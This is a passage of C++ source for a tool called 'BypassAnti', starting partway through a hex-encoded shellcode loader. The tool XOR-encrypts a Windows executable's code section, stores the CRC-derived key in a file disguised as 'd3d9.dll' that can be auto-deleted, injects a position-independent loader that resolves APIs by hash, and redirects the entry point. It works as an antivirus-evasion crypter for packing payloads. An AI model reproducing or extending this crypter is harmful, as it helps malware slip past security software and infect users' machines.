  0x48, 0x8B, 0x8C, 0x24, 0x58, 0x05, 0x00, 0x00, 0x48, 0x83,
  0x3C, 0x01, 0x00, 0x74, 0x36, 0xBA, 0x25, 0xB0, 0xFF, 0xC2,
  0x48, 0x8B, 0x4C, 0x24, 0x78, 0xE8, 0xA6, 0xFA, 0xFF, 0xFF,
  0x48, 0x89, 0x84, 0x24, 0x18, 0x01, 0x00, 0x00, 0x48, 0x8B,
  0x84, 0x24, 0x18, 0x01, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24,
  0x20, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00,
  0x00, 0x00, 0xFF, 0x94, 0x24, 0x20, 0x01, 0x00, 0x00, 0x48,
  0x8B, 0x84, 0x24, 0x50, 0x05, 0x00, 0x00, 0x48, 0x89, 0x84,
  0x24, 0x28, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x28,
  0x01, 0x00, 0x00, 0x48, 0x63, 0x40, 0x3C, 0x48, 0x8B, 0x8C,
  0x24, 0x50, 0x05, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
  0xC1, 0x48, 0x89, 0x84, 0x24, 0xB0, 0x00, 0x00, 0x00, 0xB8,
  0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x05, 0x48, 0x8B,
  0x8C, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x83, 0xBC, 0x01, 0x88,
  0x00, 0x00, 0x00, 0x00, 0x0F, 0x86, 0x9E, 0x01, 0x00, 0x00,
  0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x05, 0x48,
  0x8B, 0x8C, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x83, 0xBC, 0x01,
  0x8C, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x86, 0x7F, 0x01, 0x00,
  0x00, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x06,
  0x48, 0x8B, 0x8C, 0x24, 0x58, 0x05, 0x00, 0x00, 0x48, 0x8B,
  0x04, 0x01, 0x48, 0x8B, 0x8C, 0x24, 0x50, 0x05, 0x00, 0x00,
  0x48, 0x2B, 0xC8, 0x48, 0x8B, 0xC1, 0x89, 0x84, 0x24, 0x30,
  0x01, 0x00, 0x00, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B,
  0xC0, 0x05, 0x48, 0x8B, 0x8C, 0x24, 0xB0, 0x00, 0x00, 0x00,
  0x8B, 0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8C,
  0x24, 0x50, 0x05, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
  0xC1, 0x48, 0x89, 0x44, 0x24, 0x68, 0x48, 0x8B, 0x44, 0x24,
  0x68, 0x8B, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x68, 0x03, 0x41,
  0x04, 0x85, 0xC0, 0x0F, 0x84, 0x13, 0x01, 0x00, 0x00, 0x48,
  0x8B, 0x44, 0x24, 0x68, 0x48, 0x83, 0xC0, 0x08, 0x48, 0x89,
  0x84, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24,
  0x68, 0x8B, 0x40, 0x04, 0x48, 0x83, 0xE8, 0x08, 0x33, 0xD2,
  0xB9, 0x02, 0x00, 0x00, 0x00, 0x48, 0xF7, 0xF1, 0x89, 0x84,
  0x24, 0x9C, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x48, 0x00,
  0x00, 0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x48, 0xFF,
  0xC0, 0x89, 0x44, 0x24, 0x48, 0x8B, 0x84, 0x24, 0x9C, 0x00,
  0x00, 0x00, 0x39, 0x44, 0x24, 0x48, 0x0F, 0x8D, 0xA3, 0x00,
  0x00, 0x00, 0x48, 0x63, 0x44, 0x24, 0x48, 0x48, 0x8B, 0x8C,
  0x24, 0xB8, 0x00, 0x00, 0x00, 0x0F, 0xB7, 0x04, 0x41, 0x25,
  0x00, 0xF0, 0x00, 0x00, 0x3D, 0x00, 0x30, 0x00, 0x00, 0x74,
  0x1D, 0x48, 0x63, 0x44, 0x24, 0x48, 0x48, 0x8B, 0x8C, 0x24,
  0xB8, 0x00, 0x00, 0x00, 0x0F, 0xB7, 0x04, 0x41, 0x25, 0x00,
  0xF0, 0x00, 0x00, 0x3D, 0x00, 0xA0, 0x00, 0x00, 0x75, 0x64,
  0x48, 0x8B, 0x44, 0x24, 0x68, 0x8B, 0x00, 0x48, 0x8B, 0x8C,
  0x24, 0x50, 0x05, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
  0xC1, 0x48, 0x63, 0x4C, 0x24, 0x48, 0x48, 0x8B, 0x94, 0x24,
  0xB8, 0x00, 0x00, 0x00, 0x0F, 0xB7, 0x0C, 0x4A, 0x81, 0xE1,
  0xFF, 0x0F, 0x00, 0x00, 0x48, 0x63, 0xC9, 0x48, 0x03, 0xC1,
  0x48, 0x89, 0x84, 0x24, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x8B,
  0x84, 0x24, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x00, 0x48,
  0x25, 0xFF, 0xFF, 0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0x50,
  0x05, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
  0x8B, 0x8C, 0x24, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x01,
  0xE9, 0x42, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x44, 0x24, 0x68,
  0x8B, 0x40, 0x04, 0x48, 0x8B, 0x4C, 0x24, 0x68, 0x48, 0x03,
  0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x68, 0xE9,
  0xD6, 0xFE, 0xFF, 0xFF, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48,
  0x6B, 0xC0, 0x05, 0x48, 0x8B, 0x8C, 0x24, 0x58, 0x05, 0x00,
  0x00, 0x48, 0x8B, 0x04, 0x01, 0x48, 0x8B, 0x8C, 0x24, 0x50,
  0x05, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
  0x81, 0xC4, 0x48, 0x05, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC,
  0xCC, 0xCC, 0x89, 0x54, 0x24, 0x10, 0x89, 0x4C, 0x24, 0x08,
  0x8B, 0x44, 0x24, 0x10, 0x0F, 0xB6, 0xC8, 0x8B, 0x44, 0x24,
  0x08, 0xD3, 0xE0, 0xB9, 0x20, 0x00, 0x00, 0x00, 0x2B, 0x4C,
  0x24, 0x10, 0x8B, 0x54, 0x24, 0x08, 0xD3, 0xFA, 0x8B, 0xCA,
  0x0B, 0xC1, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
  0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x58, 0x50, 0xC3, 0x56,
  0x57, 0x48, 0x8B, 0xF1, 0x48, 0x33, 0xFF, 0xFC, 0x48, 0x33,
  0xC0, 0xAC, 0x3A, 0xC4, 0x74, 0x07, 0xC1, 0xCF, 0x0D, 0x03,
  0xF8, 0xEB, 0xF1, 0x48, 0x8B, 0xC7, 0x5F, 0x5E, 0xC3, 0x48,
  0x33, 0xC0, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00,
  0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x40, 0x20, 0x48,
  0x8B, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x40, 0x20, 0xC3,
  0x48, 0x33, 0xC0, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00,
  0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x40, 0x20,
  0x48, 0x8B, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x00, 0x48,
  0x8B, 0x40, 0x20, 0xC3, 0xCC, 0xCC
};

//保存key列表
/*
+0x00	newseg_rva
+0x08	newseg_size
+0x10	BaseOfCode
+0x18	CodeSize
+0x20	CodeKey
+0x28	OEP
+0x30	origin_imageBase
+0x38	deleteKey
*/
std::vector<uint64_t> KeyTable{};

uint32_t  crc32 (uint8_t* ptr, uint32_t Size)
{
	uint32_t crcTable[256], crcTmp1;

	// 动态生成CRC-32表
	for (int i = 0; i < 256; i++)
	{
		crcTmp1 = i;
		for (int j = 8; j > 0; j--)
		{
			if (crcTmp1 & 1) crcTmp1 = (crcTmp1 >> 1) ^ 0xEDB88320L;
			else crcTmp1 >>= 1;
		}
		crcTable[i] = crcTmp1;
	}

	// 计算CRC32值
	uint32_t crcTmp2 = 0xFFFFFFFF;
	while (Size--)
	{
		crcTmp2 = ((crcTmp2 >> 8) & 0x00FFFFFF) ^ crcTable[(crcTmp2 ^ (*ptr)) & 0xFF];
		ptr++;
	}
	return (crcTmp2 ^ 0xFFFFFFFF);
}


uint32_t ____rotl(int x, int n) {
	return (x << n) | (x >> (32 - n));
}

int main(int argc,char* argv[])
{
	if (argc < 2)
	{
	help:
		printf("Usage: BypassAnti\n");
		printf("\t-f		(required) filename\n");
		printf("\t-k		(optional) key filename,default 'c:\\d3d9.dll'\n");
		printf("\t-s		(optional) new section name,default '.ba'\n");
		printf("\t[-d]	(optional) automatically delete key file after running\n");
		return 0;
	}

	bool del = false;
	std::string filename = {};
	std::string keyfilename = "C:\\Users\\PlaneJun\\Desktop\\VM测试\\vmtest\\x64\\Debug\\d3d9.dll";
	std::string segname = ".ba";
	try {
		for (int i = 1; i < argc; i++)
		{
			if (!strcmp(argv[i], "-f"))
				filename = argv[i + 1];
			else if (!strcmp(argv[i], "-s"))
				segname = argv[i + 1];
			else if (!strcmp(argv[i], "-k"))
				keyfilename = argv[i + 1];
			else if (!strcmp(argv[i], "-d"))
				del =true;
		}
	}
	catch (std::exception& e)
	{
		goto help;
	}
	srand(time(0));
	PEFile pe(filename.c_str());

	size_t newSectionSize = 0x1000;
	if (pe.arch64())
		newSectionSize += (sizeof(loader64)-4);
	else
		newSectionSize +=(sizeof(loader32) - 4);

	PIMAGE_SECTION_HEADER pNewSection = 0;
	pe.AppendSection(segname, newSectionSize, IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE, &pNewSection);
	if (!pNewSection)
	{
		printf("Add New Section Error!\n");
		return 0;
	}
	KeyTable.push_back(pNewSection->VirtualAddress); //添加新节区地址
	KeyTable.push_back(pNewSection->Misc.VirtualSize); //添加新节区大小
	//加密.text
	for (auto seg = pe.GetSectionHeader(); seg != 0; seg++)
	{
		if (!strcmp((char*)seg->Name, ".text"))
		{
			KeyTable.push_back(seg->VirtualAddress);//添加代码段地址
			KeyTable.push_back(seg->Misc.VirtualSize);//添加代码段大小

			uint8_t* code = new uint8_t[seg->SizeOfRawData];
			pe.ReadBytes(seg->VirtualAddress, code, seg->SizeOfRawData);
			uint32_t crc = crc32(code, seg->SizeOfRawData);
			delete[] code;

			int d = keyfilename.rfind("\\");
			FILE* t = fopen(keyfilename.substr(d+1).c_str(), "wb+");
			if (!t)
			{
				printf("create key file error\n");
				return 0;
			}
			fwrite(&crc, 1, 4, t);
			fclose(t);

			uint32_t _key = 0;
			pe.Read<uint32_t>(seg->VirtualAddress, _key);//添加Key
			KeyTable.push_back(_key ^ crc);
			//加密
			for (int i = 0; i < seg->Misc.VirtualSize; i++)
			{
				uint8_t origin_byte = 0;
				pe.Read<uint8_t>(seg->VirtualAddress + i, origin_byte);
				pe.Write<uint8_t>(seg->VirtualAddress + i, origin_byte ^ static_cast<uint8_t>(____rotl(_key, i) + i));
			}
			break;
		}
	}

	//获取原先入口
	uint8_t* pOtionalHeader = pe.GetOptionalHeader();
	uint32_t oep = pe.arch64() ? reinterpret_cast<PIMAGE_OPTIONAL_HEADER64>(pOtionalHeader)->AddressOfEntryPoint : reinterpret_cast<PIMAGE_OPTIONAL_HEADER32>(pOtionalHeader)->AddressOfEntryPoint;
	KeyTable.push_back(oep);
	//写入Loader
	if (pe.arch64())
	{
		static uint8_t header[] = {
			0xE8,0x00,0x00,0x00,0x00,													//call $0
			0x58,																					//pop rax
			0x48,0x83,0xE8,0x05,															//sub rax,5
			0x48,0x8D,0x90,0x67,0x45,0x23,0x01,									//lea rdx,[rax+offset_data]
			0x48,0x2B,0x02,																	//sub rax, qword ptr ds:[rcx]
			0x48,0x8B,0xC8,																	//mov rcx, rax
			0xE8,0x16,0x00,0x00,0x00,													//call Loader
			0xFF,0xE0																				//jmp rax
		};

		uint32_t loader_size = sizeof(loader64) - 4;
		uint8_t* code = &loader64[4];
		uint32_t offset_entry = *(uint32_t*)loader64;
		//fix
		*(uint32_t*)&header[24] = offset_entry - 5;
		*(uint32_t*)&header[13] = sizeof(header) + loader_size;
		//write
		ByteVector shellcode{};
		shellcode.insert_data(0, header, sizeof(header));
		shellcode.insert_data(shellcode.size(), code, loader_size);

		//写入数据
		KeyTable.push_back(reinterpret_cast<PIMAGE_OPTIONAL_HEADER64>(pOtionalHeader)->ImageBase);
		KeyTable.push_back(del);
		for (int i = 0; i < KeyTable.size(); i++)
			shellcode.insert_data(shellcode.size(), &KeyTable[i], sizeof(KeyTable[i]));
		//写入路径
		for (int i = 0; i < keyfilename.length(); i++)
			keyfilename[i] = ~keyfilename[i];
		shellcode.insert_data(shellcode.size(), keyfilename.c_str(), keyfilename.length());

		pe.WriteBytes(pNewSection->VirtualAddress, shellcode.data(), shellcode.size());
	}
	else {

		static uint8_t header[] = {
			0xE8,0x00,0x00,0x00,0x00,					//call $0
			0x58,													//pop eax
			0x83,0xE8,0x05,									//sub eax,5
			0x8D,0x88,0x1A,0x02,0x00,0x00			//lea ecx,[eax+offset_data]
			,0x2B,0x01,											//sub eax,[ecx]
			0x51,													//push ecx
			0x50,													//push eax
			0xE8,0x12,0x00,0x00,0x00,					//call Loader
			0x83,0xC4,0x08,									//add esp,8
			0xFF,0xE0												//jmp eax
		};
		uint32_t loader_size = sizeof(loader32) - 4;
		uint8_t* code = &loader32[4];
		uint32_t offset_entry =*(uint32_t*)loader32;

		//fix
		*(uint32_t*)&header[20] = offset_entry-5;
		*(uint32_t*)&header[11] = sizeof(header)+ loader_size;
		//write
		ByteVector shellcode{};
		shellcode.insert_data(0, header, sizeof(header));
		shellcode.insert_data(shellcode.size(), code, loader_size);
		
		//写入数据
		KeyTable.push_back(reinterpret_cast<PIMAGE_OPTIONAL_HEADER32>(pOtionalHeader)->ImageBase);
		KeyTable.push_back(del);
		for (int i = 0; i < KeyTable.size(); i++)
			shellcode.insert_data(shellcode.size(), &KeyTable[i], sizeof(KeyTable[i]));
		//写入路径
		for (int i = 0; i < keyfilename.length(); i++)
			keyfilename[i]=~keyfilename[i];
		shellcode.insert_data(shellcode.size(), keyfilename.c_str(), keyfilename.length());

		pe.WriteBytes(pNewSection->VirtualAddress, shellcode.data(), shellcode.size());
	}

	pe.SetEntryPoint(pNewSection->VirtualAddress);
	pe.WriteToFile(filename+".bypass");
	printf("finish\n");
	return 0;
}

